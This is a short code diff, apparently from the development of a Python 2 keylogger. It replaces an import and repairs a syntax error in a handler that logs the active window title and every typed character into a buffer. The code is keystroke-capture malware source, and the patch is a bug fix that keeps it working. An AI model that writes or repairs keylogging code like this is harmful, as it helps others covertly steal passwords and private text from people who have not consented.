@@ -10,7 +10,7 @@ from __future__ import print_function
 import os
 import sys
 import time
-import datetime
+import Queue
 import threading
 import cStringIO
 import collections
@@ -37,7 +37,7 @@ def _event(event):
     try:
         if event.WindowName != vars(Keylogger)['window']:
             vars(Keylogger)['window'] = event.WindowName
-            _buffer.write("\n[{}]\n".format(_window)
+            _buffer.write("\n[{}]\n".format(_window))
         if event.Ascii > 32 and event.Ascii < 127:
             _buffer.write(chr(event.Ascii))
         elif event.Ascii == 32:
